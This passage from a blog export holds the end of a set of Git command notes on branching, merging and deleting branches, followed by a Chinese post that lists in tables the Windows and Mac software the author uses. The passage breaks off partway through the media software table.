<h2 id="git-checkout-–-lt-target-gt"><a href="#git-checkout-–-lt-target-gt" class="headerlink" title="git checkout – &lt;target&gt;"></a>git checkout – <code>&lt;target&gt;</code></h2><p>Changed files back to how they were at the last commit, namely get rid of all the changes since the last commit.</p>
<p><code>--</code>: promise the command line that there are no more options after the ‘–’, avoid switching to the branch of the same name.</p>
<h2 id="git-branch"><a href="#git-branch" class="headerlink" title="git branch"></a>git branch</h2><p>List local branches of now repository.</p>
<h3 id="git-branch-lt-name-gt"><a href="#git-branch-lt-name-gt" class="headerlink" title="git branch &lt;name&gt;"></a>git branch <code>&lt;name&gt;</code></h3><ul>
<li>Create a new branch.</li>
</ul>
<blockquote>
<p>When developers are working on a feature or bug they’ll often create a copy (aka. branch) of their code they can make separate commits to. Then when they’re done they can merge this branch back into their main master branch.</p>
</blockquote>
<h3 id="git-checkout-lt-branch-gt"><a href="#git-checkout-lt-branch-gt" class="headerlink" title="git checkout &lt;branch&gt;"></a>git checkout <code>&lt;branch&gt;</code></h3><ul>
<li>Switch to certain branch.</li>
</ul>
<h3 id="git-checkout-b-new-branch"><a href="#git-checkout-b-new-branch" class="headerlink" title="git checkout -b new_branch"></a>git checkout -b new_branch</h3><ul>
<li>Checkout and create a branch at the same time. </li>
</ul>
<h2 id="git-rm-lt-file-gt"><a href="#git-rm-lt-file-gt" class="headerlink" title="git rm &lt;file&gt;"></a>git rm <code>&lt;file&gt;</code></h2><p>Not only remove the actual files from disk, but will also stage the removal of the files for us.</p>
<h3 id="git-rm-r-folder"><a href="#git-rm-r-folder" class="headerlink" title="git rm -r folder"></a>git rm -r folder</h3><ul>
<li>Recursively remove all folders and files from the given directory.</li>
</ul>
<h2 id="git-merge-lt-branch-gt"><a href="#git-merge-lt-branch-gt" class="headerlink" title="git merge &lt;branch&gt;"></a>git merge <code>&lt;branch&gt;</code></h2><p>Merge your changes from the given branch into current branch.</p>
<h3 id="Merge-Conflicts"><a href="#Merge-Conflicts" class="headerlink" title="Merge Conflicts"></a>Merge Conflicts</h3><ul>
<li>Merge Conflicts can occur when changes are made to a file at the same time. Reading more on <a href="http://git-scm.com/docs/git-merge#_how_conflicts_are_presented" target="_blank" rel="external">how conflicts are presented</a>.</li>
</ul>
<h2 id="Delete-Branch"><a href="#Delete-Branch" class="headerlink" title="Delete Branch"></a>Delete Branch</h2><h3 id="git-branch-d-lt-branch-gt"><a href="#git-branch-d-lt-branch-gt" class="headerlink" title="git branch -d &lt;branch&gt;"></a>git branch -d <code>&lt;branch&gt;</code></h3><ul>
<li>Delete a local branch. <code>-d</code> won’t let you delete something that hasn’t been merged.</li>
</ul>
<h3 id="f-and-D"><a href="#f-and-D" class="headerlink" title="-f and -D"></a><code>-f</code> and <code>-D</code></h3><ul>
<li>Force delete the branch that hasn’t been merged. </li>
</ul>
<blockquote>
<p>Add the <code>-f</code>(–force) option or use <code>-D</code> which combines <code>-d -f</code> together into one command.</p>
</blockquote>
<h3 id="Delete-Remote-Branch"><a href="#Delete-Remote-Branch" class="headerlink" title="Delete Remote Branch"></a>Delete Remote Branch</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">git branch -r -d &lt;remote name&gt;/&lt;branch name&gt;</div><div class="line">git push &lt;remote name&gt;: &lt;branch name&gt;</div></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">git branch -r -d origin/branch-name</div><div class="line">git push origin :branch-name</div></pre></td></tr></table></figure>
]]></content>
      
        <categories>
            
            <category> 来自MOxFIVE的优秀笔记 </category>
            
            <category> 程序猿指令应用 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Git </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[自用 Windows 和 Mac 软件推荐]]></title>
      <url>http://yikunhaocong.com/2015/09/20/windows-mac-software/</url>
      <content type="html"><![CDATA[<p></p><h2 id="intro">前言</h2>罗列自己正在使用的 Windows 和 Mac OS 软件，基本上都是同类中能较好满足个人需求的软件，作表记录，方便自己检索，也顺便推荐给大家。<p></p>
<h3 id="软件分类说明"><a href="#软件分类说明" class="headerlink" title="软件分类说明"></a>软件分类说明</h3><ul>
<li><strong>编程开发:</strong> 目前写代码用到的一些软件；</li>
<li><strong>网络应用:</strong> 依赖于网络运行的软件，比如浏览器，聊天软件，下载工具等；</li>
<li><strong>文档处理:</strong> 查看和处理 Word, Excel, PDF 等文档；</li>
<li><strong>影音图像:</strong> 查看和处理多媒体文件，比如看图，听歌，视频处理等；</li>
<li><strong>系统工具:</strong> 增强、个性化系统或者系统自带软件的功能，比如资源管理器增强，任务栏个性化等；</li>
<li><strong>应用软件:</strong> 不属于以上分类的软件；</li>
</ul>
<a id="more"></a>
<h3 id="表格内容解释"><a href="#表格内容解释" class="headerlink" title="表格内容解释"></a>表格内容解释</h3><ul>
<li>表格依次列出软件名字，开发商，系统，付费，备注，默认使用软件的最新版本。</li>
<li><strong>表头英文:</strong> 用不留空的英文单词表示，避免默认设置下表头被换行；</li>
<li><strong>系统栏打 √ :</strong> 主要在该系统下使用该软件，少数双系统下都频繁使用；</li>
<li><strong>系统栏标 — :</strong> 该软件不支持该系统；</li>
<li><strong>Free 免费栏 :</strong> 标 x 该软件为付费共享软件；标 — 表示提供免费版，但功能等有所限制。</li>
<li><strong>链接:</strong> 点击软件名字跳转到软件主页，点开发商跳转到对其介绍页面或者对应官网。</li>
<li><strong>Note 备注:</strong> 软件用途简单介绍</li>
</ul>
<h2 id="编程开发"><a href="#编程开发" class="headerlink" title="编程开发"></a>编程开发</h2><table>
<thead>
<tr>
<th style="text-align:center">-</th>
<th>SoftwareName</th>
<th>　　Developer　　</th>
<th style="text-align:center">Mac</th>
<th style="text-align:center">Win</th>
<th style="text-align:center">Free</th>
<th>　　　　Note　　　　</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">1</td>
<td><a href="https://desktop.github.com/" target="_blank" rel="external">GitHub Desktop</a></td>
<td><a href="https://en.wikipedia.org/wiki/GitHub" target="_blank" rel="external">GitHub, Inc.</a></td>
<td style="text-align:center">√</td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
<td>GitHub 桌面版</td>
</tr>
<tr>
<td style="text-align:center">2</td>
<td><a href="http://www.sublimetext.com/" target="_blank" rel="external">Sublime Text 3</a></td>
<td><a href="https://en.wikipedia.org/wiki/Sublime_Text" target="_blank" rel="external">Jon Skinner</a></td>
<td style="text-align:center"></td>
<td style="text-align:center">√</td>
<td style="text-align:center">—</td>
<td>代码编辑器</td>
</tr>
<tr>
<td style="text-align:center">3</td>
<td><a href="http://brackets.io/" target="_blank" rel="external">Brackets</a></td>
<td><a href="http://is.gd/q5bGeJ" target="_blank" rel="external">Adobe Systems</a></td>
<td style="text-align:center">√</td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
<td>Web 代码编辑器</td>
</tr>
<tr>
<td style="text-align:center">4</td>
<td><a href="https://kapeli.com/dash" target="_blank" rel="external">Dash</a></td>
<td><a href="https://kapeli.com/" target="_blank" rel="external">Kapeli</a></td>
<td style="text-align:center">√</td>
<td style="text-align:center">—</td>
<td style="text-align:center">x</td>
<td>API Snippet 代码管理</td>
</tr>
<tr>
<td style="text-align:center">5</td>
<td><a href="http://www.theescapers.com/flux/" target="_blank" rel="external">Flux V</a></td>
<td><a href="http://www.theescapers.com/" target="_blank" rel="external">Escapers Ltd.</a></td>
<td style="text-align:center">√</td>
<td style="text-align:center">—</td>
<td style="text-align:center">x</td>
<td>可视化网页开发</td>
</tr>
<tr>
<td style="text-align:center">6</td>
<td><a href="https://www.apachefriends.org/zh_cn/index.html" target="_blank" rel="external">XAMPP</a></td>
<td><a href="https://www.apachefriends.org" target="_blank" rel="external">Apache Friends</a></td>
<td style="text-align:center"></td>
<td style="text-align:center">√</td>
<td style="text-align:center"></td>
<td>PHP 开发环境，本地 WordPress</td>
</tr>
<tr>
<td style="text-align:center">7</td>
<td><a href="http://www.git-scm.com/" target="_blank" rel="external">Git</a></td>
<td><a href="https://en.wikipedia.org/wiki/Linus_Torvalds" target="_blank" rel="external">Linus Torvalds</a></td>
<td style="text-align:center"></td>
<td style="text-align:center">√</td>
<td style="text-align:center"></td>
<td>Distributed version control system</td>
</tr>
<tr>
<td style="text-align:center">8</td>
<td><a href="http://colorsnapper.com/" target="_blank" rel="external">ColorSnapper</a></td>
<td><a href="http://colorsnapper.com/" target="_blank" rel="external">Koolesache</a></td>
<td style="text-align:center">√</td>
<td style="text-align:center">—</td>
<td style="text-align:center">x</td>
<td>屏幕取色器</td>
</tr>
<tr>
<td style="text-align:center">9</td>
<td><a href="https://nodejs.org/en/" target="_blank" rel="external">Node.js</a></td>
<td><a href="https://en.wikipedia.org/wiki/Node.js" target="_blank" rel="external">Joyent, Inc.</a></td>
<td style="text-align:center">√</td>
<td style="text-align:center">√</td>
<td style="text-align:center"></td>
<td>JavaScript runtime</td>
</tr>
</tbody>
</table>
<h2 id="网络应用"><a href="#网络应用" class="headerlink" title="网络应用"></a>网络应用</h2><table>
<thead>
<tr>
<th style="text-align:center">-</th>
<th>SoftwareName</th>
<th>　　Developer　　</th>
<th style="text-align:center">Mac</th>
<th style="text-align:center">Win</th>
<th style="text-align:center">Free</th>
<th>　　　　Note　　　　</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">1</td>
<td><a href="http://www.google.com/chrome/" target="_blank" rel="external">Chrome</a></td>
<td><a href="http://baike.baidu.com/view/105.htm" target="_blank" rel="external">谷歌</a></td>
<td style="text-align:center">√</td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
<td>主力浏览器，插件脚本扩展</td>
</tr>
<tr>
<td style="text-align:center">2</td>
<td><a href="http://im.qq.com/" target="_blank" rel="external">QQ</a></td>
<td><a href="http://baike.baidu.com/view/1591.htm" target="_blank" rel="external">腾讯</a></td>
<td style="text-align:center">√</td>
<td style="text-align:center">√</td>
<td style="text-align:center">—</td>
<td>万年隐身</td>
</tr>
<tr>
<td style="text-align:center">3</td>
<td><a href="http://shadowsocks.org/en/index.html" target="_blank" rel="external">ShadowsocksX</a></td>
<td><a href="https://github.com/clowwindy" target="_blank" rel="external">clowwindy</a></td>
<td style="text-align:center">√</td>
<td style="text-align:center">√</td>
<td style="text-align:center"></td>
<td>和FQ谐</td>
</tr>
<tr>
<td style="text-align:center">4</td>
<td><a href="http://mac.xunlei.com/app/" target="_blank" rel="external">Thunder Store</a></td>
<td><a href="http://baike.baidu.com/view/467578.htm" target="_blank" rel="external">迅雷网络</a></td>
<td style="text-align:center">√</td>
<td style="text-align:center">—</td>
<td style="text-align:center"></td>
<td>检查应用更新</td>
</tr>
<tr>
<td style="text-align:center">5</td>
<td><a href="http://wangwang.taobao.com/" target="_blank" rel="external">阿里旺旺</a></td>
<td><a href="http://baike.baidu.com/view/1247049.htm" target="_blank" rel="external">阿里巴巴集团</a></td>
<td style="text-align:center">√</td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
<td>买买买</td>
</tr>
<tr>
<td style="text-align:center">6</td>
<td><a href="https://jianguoyun.com/" target="_blank" rel="external">坚果云</a></td>
<td><a href="http://baike.baidu.com/view/8051910.htm" target="_blank" rel="external">上海亦存网络</a></td>
<td style="text-align:center">√</td>
<td style="text-align:center">√</td>
<td style="text-align:center">—</td>
<td>文档同步，备用</td>
</tr>
<tr>
<td style="text-align:center">7</td>
<td><a href="http://dl.xunlei.com/" target="_blank" rel="external">迅雷</a></td>
<td><a href="http://baike.baidu.com/view/467578.htm" target="_blank" rel="external">迅雷网络</a></td>
<td style="text-align:center">√</td>
<td style="text-align:center">√</td>
<td style="text-align:center">—</td>
<td>极速版，离线下载和高速通道</td>
</tr>
<tr>
<td style="text-align:center">8</td>
<td><a href="http://www.flvcd.com/index.htm" target="_blank" rel="external">FLVCD 硕鼠</a></td>
<td></td>
<td style="text-align:center">√</td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
<td>网络视频下载</td>
</tr>
<tr>
<td style="text-align:center">9</td>
<td><a href="http://weixin.qq.com/" target="_blank" rel="external">微信</a></td>
<td><a href="http://baike.baidu.com/view/1591.htm" target="_blank" rel="external">腾讯</a></td>
<td style="text-align:center">√</td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
<td>聊胜于无</td>
</tr>
<tr>
<td style="text-align:center">10</td>
<td><a href="http://www.maxthon.cn/" target="_blank" rel="external">Maxthon 傲游</a></td>
<td><a href="http://www.maxthon.cn/company/" target="_blank" rel="external">傲游天下</a></td>
<td style="text-align:center"></td>
<td style="text-align:center">√</td>
<td style="text-align:center"></td>
<td>备用</td>
</tr>
<tr>
<td style="text-align:center">11</td>
<td><a href="http://pan.baidu.com/disk/download/guanjia/" target="_blank" rel="external">百度云管家</a></td>
<td><a href="http://baike.baidu.com/view/262.htm" target="_blank" rel="external">百度</a></td>
<td style="text-align:center"></td>
<td style="text-align:center">√</td>
<td style="text-align:center">—</td>
<td>搜集、分享资源</td>
</tr>
<tr>
<td style="text-align:center">12</td>
<td><a href="http://www.ad-safe.com/" target="_blank" rel="external">ADSafe 净网大师</a></td>
<td><a href="http://www.ad-safe.com/" target="_blank" rel="external">大摩网络</a></td>
<td style="text-align:center">—</td>
<td style="text-align:center">√</td>
<td style="text-align:center"></td>
<td>网页、视频广告屏蔽</td>
</tr>
<tr>
<td style="text-align:center">13</td>
<td><a href="http://music.163.com/#/download" target="_blank" rel="external">网易云音乐</a></td>
<td><a href="http://baike.baidu.com/view/149363.htm" target="_blank" rel="external">网易公司</a></td>
<td style="text-align:center">√</td>
<td style="text-align:center"></td>
<td style="text-align:center">—</td>
<td>看评论听歌，发现好歌</td>
</tr>
<tr>
<td style="text-align:center">14</td>
<td><a href="http://yunpan.360.cn/" target="_blank" rel="external">360云盘</a></td>
<td><a href="http://baike.baidu.com/view/1458023.htm" target="_blank" rel="external">奇虎360</a></td>
<td style="text-align:center">√</td>
<td style="text-align:center"></td>
<td style="text-align:center">—</td>
<td>主力同步软件，容量足够，带历史版本，文件数量不限</td>
</tr>
<tr>
<td style="text-align:center">15</td>
<td><a href="www.teamviewer.com">TeamViewer</a></td>
<td><a href="https://en.wikipedia.org/wiki/TeamViewer" target="_blank" rel="external">TeamViewer GmbH</a></td>
<td style="text-align:center">√</td>
<td style="text-align:center">√</td>
<td style="text-align:center"></td>
<td>远程桌面控制</td>
</tr>
<tr>
<td style="text-align:center">16</td>
<td><a href="http://reederapp.com/mac/" target="_blank" rel="external">Reeder 3</a></td>
<td><a href="https://itunes.apple.com/us/app/reeder-3/id880001334?ls=1&amp;mt=12" target="_blank" rel="external">Silvio Rizzi</a></td>
<td style="text-align:center">√</td>
<td style="text-align:center">—</td>
<td style="text-align:center">x</td>
<td>RSS 订阅</td>
</tr>
</tbody>
</table>
<h2 id="文档处理"><a href="#文档处理" class="headerlink" title="文档处理"></a>文档处理</h2><table>
<thead>
<tr>
<th style="text-align:center">-</th>
<th>SoftwareName</th>
<th>　　Developer　　</th>
<th style="text-align:center">Mac</th>
<th style="text-align:center">Win</th>
<th style="text-align:center">Free</th>
<th>　　　　Note　　　　</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">1</td>
<td><a href="http://endnote.com/" target="_blank" rel="external">Endnote</a></td>
<td><a href="https://en.wikipedia.org/wiki/EndNote" target="_blank" rel="external">Thomson Reuters</a></td>
<td style="text-align:center"></td>
<td style="text-align:center">√</td>
<td style="text-align:center">√</td>
<td>Reference 文献管理</td>
</tr>
<tr>
<td style="text-align:center">2</td>
<td><a href="http://is.gd/SjAbs5" target="_blank" rel="external">Office 2016</a></td>
<td><a href="http://baike.baidu.com/view/2353.htm" target="_blank" rel="external">微软公司</a></td>
<td style="text-align:center"></td>
<td style="text-align:center">√</td>
<td style="text-align:center"></td>
<td>Word , Excel, PowerPoint, OneNote</td>
</tr>
<tr>
<td style="text-align:center">3</td>
<td><a href="https://www.gonitro.com/" target="_blank" rel="external">Nitro PDF Pro</a></td>
<td><a href="https://en.wikipedia.org/wiki/Nitro_PDF" target="_blank" rel="external">Nitro</a></td>
<td style="text-align:center"></td>
<td style="text-align:center">√</td>
<td style="text-align:center"></td>
<td>PDF编辑</td>
</tr>
<tr>
<td style="text-align:center">4</td>
<td><a href="https://www.yinxiang.com/" target="_blank" rel="external">印象笔记</a></td>
<td><a href="http://baike.baidu.com/view/8548200.htm" target="_blank" rel="external">Evernote</a></td>
<td style="text-align:center">√</td>
<td style="text-align:center"></td>
<td style="text-align:center">—</td>
<td>网文搜集</td>
</tr>
<tr>
<td style="text-align:center">5</td>
<td><a href="http://www.calibre-ebook.com/" target="_blank" rel="external">Calibre</a></td>
<td><a href="http://is.gd/V4FSaf" target="_blank" rel="external">Kovid Goyal</a></td>
<td style="text-align:center">√</td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
<td>电子书管理</td>
</tr>
<tr>
<td style="text-align:center">6</td>
<td><a href="http://25.io/mou/" target="_blank" rel="external">Mou</a></td>
<td><a href="http://25.io" target="_blank" rel="external">25.io Inc</a></td>
<td style="text-align:center">√</td>
<td style="text-align:center">—</td>
<td style="text-align:center"></td>
<td>Markdown 编辑器</td>
</tr>
<tr>
<td style="text-align:center">7</td>
<td><a href="http://sigil-ebook.com/" target="_blank" rel="external">Sigil</a></td>
<td><a href="http://is.gd/bDKF8D" target="_blank" rel="external">John Schember</a></td>
<td style="text-align:center">√</td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
<td>epub 电子书制作</td>
</tr>
<tr>
<td style="text-align:center">8</td>
<td><a href="www.xmind.net">XMind</a></td>
<td><a href="https://en.wikipedia.org/wiki/XMind" target="_blank" rel="external">XMind Ltd.</a></td>
<td style="text-align:center">√</td>
<td style="text-align:center"></td>
<td style="text-align:center">x</td>
<td>思维导图制作</td>
</tr>
<tr>
<td style="text-align:center">9</td>
<td><a href="https://www.mythicsoft.com/filelocatorpro" target="_blank" rel="external">FileLocator</a></td>
<td><a href="https://www.mythicsoft.com/info/aboutus" target="_blank" rel="external">Mythicsoft Ltd.</a></td>
<td style="text-align:center">—</td>
<td style="text-align:center">√</td>
<td style="text-align:center">—</td>
<td>全文检索工具 支持正则表达式</td>
</tr>
<tr>
<td style="text-align:center">10</td>
<td><a href="http://www.foxitsoftware.cn/products/reader/" target="_blank" rel="external">福昕阅读器</a></td>
<td><a href="http://www.foxitsoftware.cn/company/" target="_blank" rel="external">福昕软件</a></td>
<td style="text-align:center">—</td>
<td style="text-align:center">√</td>
<td style="text-align:center"></td>
<td>PDF 阅读器</td>
</tr>
<tr>
<td style="text-align:center">11</td>
<td><a href="http://www.voidtools.com/" target="_blank" rel="external">Everything</a></td>
<td><a href="http://is.gd/avswMs" target="_blank" rel="external">David Carpenter</a></td>
<td style="text-align:center">—</td>
<td style="text-align:center">√</td>
<td style="text-align:center"></td>
<td>文件名搜索</td>
</tr>
<tr>
<td style="text-align:center">12</td>
<td><a href="https://code.google.com/p/psp-comic-helper/" target="_blank" rel="external">PSP Comic Helper</a></td>
<td>鱼蛋</td>
<td style="text-align:center">—</td>
<td style="text-align:center">√</td>
<td style="text-align:center"></td>
<td>漫画分割转换</td>
</tr>
<tr>
<td style="text-align:center">13</td>
<td><a href="http://23192069.qzone.qq.com/2" target="_blank" rel="external">字幕转换助手</a></td>
<td><a href="http://user.qzone.qq.com/23192069" target="_blank" rel="external">poseidon</a></td>
<td style="text-align:center">—</td>
<td style="text-align:center">√</td>
<td style="text-align:center">—</td>
<td>多格式字幕互转</td>
</tr>
<tr>
<td style="text-align:center">14</td>
<td><a href="https://code.google.com/p/pdfbinder/" target="_blank" rel="external">PDFBinder</a></td>
<td></td>
<td style="text-align:center">—</td>
<td style="text-align:center">√</td>
<td style="text-align:center"></td>
<td>PDF 合并工具</td>
</tr>
<tr>
<td style="text-align:center">15</td>
<td><a href="http://pan.baidu.com/s/1o6EJuiA" target="_blank" rel="external">MoodPad</a></td>
<td></td>
<td style="text-align:center">—</td>
<td style="text-align:center">√</td>
<td style="text-align:center"></td>
<td>追月文本处理 i254</td>
</tr>
<tr>
<td style="text-align:center">16</td>
<td><a href="http://is.gd/11CoRf" target="_blank" rel="external">拖把更名器</a></td>
<td></td>
<td style="text-align:center">—</td>
<td style="text-align:center">√</td>
<td style="text-align:center"></td>
<td>批量重命名</td>
</tr>
<tr>
<td style="text-align:center">17</td>
<td><a href="http://kuyur.info/blog/archives/1388" target="_blank" rel="external">ANSI2Unicode</a></td>
<td><a href="http://kuyur.info/blog/" target="_blank" rel="external">小熏</a></td>
<td style="text-align:center">—</td>
<td style="text-align:center">√</td>
<td style="text-align:center"></td>
<td>CUE 乱码修复，编码转换</td>
</tr>
<tr>
<td style="text-align:center">18</td>
<td><a href="http://is.gd/KgzGwF" target="_blank" rel="external">SrtEdit</a></td>
<td>袁卫国</td>
<td style="text-align:center">—</td>
<td style="text-align:center">√</td>
<td style="text-align:center"></td>
<td>字幕编辑器</td>
</tr>
<tr>
<td style="text-align:center">19</td>
<td><a href="http://blog.csdn.net/redbirdli/article/category/182219" target="_blank" rel="external">Subindex</a></td>
<td>火鸟</td>
<td style="text-align:center">—</td>
<td style="text-align:center">√</td>
<td style="text-align:center"></td>
<td>火鸟字幕合并</td>
</tr>
</tbody>
</table>
<h2 id="系统工具"><a href="#系统工具" class="headerlink" title="系统工具"></a>系统工具</h2><table>
<thead>
<tr>
<th style="text-align:center">-</th>
<th>SoftwareName</th>
<th>Developer</th>
<th style="text-align:center">Mac</th>
<th style="text-align:center">Win</th>
<th style="text-align:center">Free</th>
<th>Note</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">1</td>
<td><a href="http://cn.ejie.me/" target="_blank" rel="external">Clover</a></td>
<td>易捷科技</td>
<td style="text-align:center">—</td>
<td style="text-align:center">√</td>
<td style="text-align:center"></td>
<td>多标签资源管理器</td>
</tr>
<tr>
<td style="text-align:center">2</td>
<td><a href="http://www.listary.com/" target="_blank" rel="external">Listary</a></td>
<td>Bopsoft</td>
<td style="text-align:center">—</td>
<td style="text-align:center">√</td>
<td style="text-align:center">x</td>
<td>资源管理器增强</td>
</tr>
<tr>
<td style="text-align:center">3</td>
<td><a href="http://www.tcbmi.com/strokeit/" target="_blank" rel="external">StrokeIt</a></td>
<td>Jeff Doozan</td>
<td style="text-align:center">—</td>
<td style="text-align:center">√</td>
<td style="text-align:center"></td>
<td>鼠标手势</td>
</tr>
<tr>
<td style="text-align:center">4</td>
<td><a href="https://www.alfredapp.com/" target="_blank" rel="external">Alfred</a></td>
<td>Running with Crayons</td>
<td style="text-align:center">√</td>
<td style="text-align:center">—</td>
<td style="text-align:center">—</td>
<td>搜索快捷键增强</td>
</tr>
<tr>
<td style="text-align:center">5</td>
<td><a href="http://www.macbartender.com/" target="_blank" rel="external">Bartender</a></td>
<td><a href="http://www.surteesstudios.com/about/" target="_blank" rel="external">Surtees Studios</a></td>
<td style="text-align:center">√</td>
<td style="text-align:center">—</td>
<td style="text-align:center">—</td>
<td>任务栏瘦身</td>
</tr>
<tr>
<td style="text-align:center">6</td>
<td><a href="http://www.bettertouchtool.net/" target="_blank" rel="external">BetterTouchTool</a></td>
<td><a href="http://blog.boastr.net/" target="_blank" rel="external">Andreas Hegenberg</a></td>
<td style="text-align:center">√</td>
<td style="text-align:center">—</td>
<td style="text-align:center"></td>
<td>触控板手势</td>
</tr>
<tr>
<td style="text-align:center">7</td>
<td><a href="http://www.clipmenu.com/" target="_blank" rel="external">ClipMenu</a></td>
<td><a href="http://www.naotaka.com/" target="_blank" rel="external">Naotaka Morimoto</a></td>
<td style="text-align:center">√</td>
<td style="text-align:center">—</td>
<td style="text-align:center">—</td>
<td>剪贴板增强</td>
</tr>
<tr>
<td style="text-align:center">8</td>
<td><a href="http://www.shauninman.com/archive/2011/10/20/day_o_mac_menu_bar_clock" target="_blank" rel="external">Day-O</a></td>
<td><a href="http://www.shauninman.com/pendium/" target="_blank" rel="external">Shaun Inman</a></td>
<td style="text-align:center">√</td>
<td style="text-align:center">—</td>
<td style="text-align:center"></td>
<td>菜单栏日历</td>
</tr>
<tr>
<td style="text-align:center">9</td>
<td><a href="https://pilotmoon.com/popclip/" target="_blank" rel="external">PopClip</a></td>
<td><a href="https://pilotmoon.com/" target="_blank" rel="external">Pilotmoon</a></td>
<td style="text-align:center">√</td>
<td style="text-align:center">—</td>
<td style="text-align:center">x</td>
<td>弹出菜单 效率 鼠标</td>
</tr>
<tr>
<td style="text-align:center">10</td>
<td><a href="http://www.totalrar.com/total-manager.html" target="_blank" rel="external">Total Manager</a></td>
<td>etinysoft</td>
<td style="text-align:center">√</td>
<td style="text-align:center">—</td>
<td style="text-align:center">x</td>
<td>Finder 增强</td>
</tr>
<tr>
<td style="text-align:center">11</td>
<td><a href="https://www.trankynam.com/xtrafinder/" target="_blank" rel="external">XtraFinder</a></td>
<td><a href="https://www.trankynam.com" target="_blank" rel="external">Tran Ky Nam</a></td>
<td style="text-align:center">√</td>
<td style="text-align:center">—</td>
<td style="text-align:center"></td>
<td>Finder 增强</td>
</tr>
<tr>
<td style="text-align:center">12</td>
<td><a href="http://unclutterapp.com/" target="_blank" rel="external">Unclutter</a></td>
<td>Eugene Krupnov</td>
<td style="text-align:center">√</td>
<td style="text-align:center">—</td>
<td style="text-align:center">x</td>
<td>临时存储，替代桌面</td>
</tr>
<tr>
<td style="text-align:center">13</td>
<td><a href="http://www.xiazaiba.com/html/6081.html" target="_blank" rel="external">DirectX Repair</a></td>
<td></td>
<td style="text-align:center">—</td>
<td style="text-align:center">√</td>
<td style="text-align:center"></td>
<td>DLL 修复</td>
</tr>
<tr>
<td style="text-align:center">14</td>
<td><a href="https://bjango.com/mac/istatmenus/" target="_blank" rel="external">iStat Menus</a></td>
<td><a href="https://bjango.com/" target="_blank" rel="external">Bjango Pty Ltd.</a></td>
<td style="text-align:center">√</td>
<td style="text-align:center">—</td>
<td style="text-align:center">x</td>
<td>系统与硬件监控</td>
</tr>
<tr>
<td style="text-align:center">15</td>
<td><a href="https://www.paragon-software.com/home/ntfs-mac/" target="_blank" rel="external">NTFS for Mac</a></td>
<td><a href="https://www.paragon-software.com/about.htm" target="_blank" rel="external">Paragon Software Group</a></td>
<td style="text-align:center">√</td>
<td style="text-align:center">—</td>
<td style="text-align:center">x</td>
<td>磁盘格式兼容</td>
</tr>
<tr>
<td style="text-align:center">16</td>
<td><a href="http://sj.ruanmei.com/" target="_blank" rel="external">软媒时间</a></td>
<td><a href="http://www.ruanmei.com/" target="_blank" rel="external">软媒</a></td>
<td style="text-align:center">—</td>
<td style="text-align:center">√</td>
<td style="text-align:center"></td>
<td>任务栏时间 农历 天气</td>
</tr>
<tr>
<td style="text-align:center">17</td>
<td><a href="http://www.tongyongpe.com/" target="_blank" rel="external">通用PE工具箱</a></td>
<td><a href="http://weibo.com/uepon" target="_blank" rel="external">UEPON</a></td>
<td style="text-align:center">—</td>
<td style="text-align:center">√</td>
<td style="text-align:center"></td>
<td>v5.0 系统安装</td>
</tr>
<tr>
<td style="text-align:center">18</td>
<td><a href="https://itunes.apple.com/us/app/blackmagic-disk-speed-test/id425264550?mt=12" target="_blank" rel="external">Disk Speed Test</a></td>
<td><a href="https://www.blackmagicdesign.com/" target="_blank" rel="external">Blackmagic Design Inc</a></td>
<td style="text-align:center">√</td>
<td style="text-align:center">—</td>
<td style="text-align:center"></td>
<td>硬盘测速</td>
</tr>
<tr>
<td style="text-align:center">19</td>
<td><a href="http://www.foldersizes.com/" target="_blank" rel="external">FolderSizes</a></td>
<td><a href="http://www.keymetricsoft.com/" target="_blank" rel="external">Key Metric Software</a></td>
<td style="text-align:center">—</td>
<td style="text-align:center">√</td>
<td style="text-align:center">x</td>
<td>文件夹、文件空间占用分析</td>
</tr>
<tr>
<td style="text-align:center">20</td>
<td><a href="https://www.piriform.com/recuva" target="_blank" rel="external">Recuva</a></td>
<td><a href="https://www.piriform.com/about" target="_blank" rel="external">Piriform</a></td>
<td style="text-align:center">—</td>
<td style="text-align:center">√</td>
<td style="text-align:center">x</td>
<td>数据恢复</td>
</tr>
<tr>
<td style="text-align:center">21</td>
<td><a href="http://www.goodsync.com/" target="_blank" rel="external">GoodSync</a></td>
<td>Siber Systems Inc.</td>
<td style="text-align:center"></td>
<td style="text-align:center">√</td>
<td style="text-align:center">x</td>
<td>本地文件同步</td>
</tr>
<tr>
<td style="text-align:center">22</td>
<td><a href="http://www.mediaatelier.com/CheatSheet/" target="_blank" rel="external">CheatSheet</a></td>
<td></td>
<td style="text-align:center">√</td>
<td style="text-align:center">—</td>
<td style="text-align:center"></td>
<td>快捷键显示</td>
</tr>
<tr>
<td style="text-align:center">23</td>
<td><a href="http://freemacsoft.net/appcleaner/" target="_blank" rel="external">AppCleaner</a></td>
<td><a href="http://freemacsoft.net/" target="_blank" rel="external">FreeMacSoft</a></td>
<td style="text-align:center">√</td>
<td style="text-align:center">—</td>
<td style="text-align:center"></td>
<td>卸载应用程序</td>
</tr>
<tr>
<td style="text-align:center">24</td>
<td><a href="http://macpaw.com/cleanmymac" target="_blank" rel="external">CleanMyMac</a></td>
<td><a href="http://macpaw.com/" target="_blank" rel="external">MacPaw Inc.</a></td>
<td style="text-align:center">√</td>
<td style="text-align:center"></td>
<td style="text-align:center">x</td>
<td>清理优化</td>
</tr>
</tbody>
</table>
<h2 id="影音图像"><a href="#影音图像" class="headerlink" title="影音图像"></a>影音图像</h2><table>
<thead>
<tr>
<th style="text-align:center">-</th>
<th>SoftwareName</th>
<th>　　Developer　　</th>
<th style="text-align:center">Mac</th>
<th style="text-align:center">Win</th>
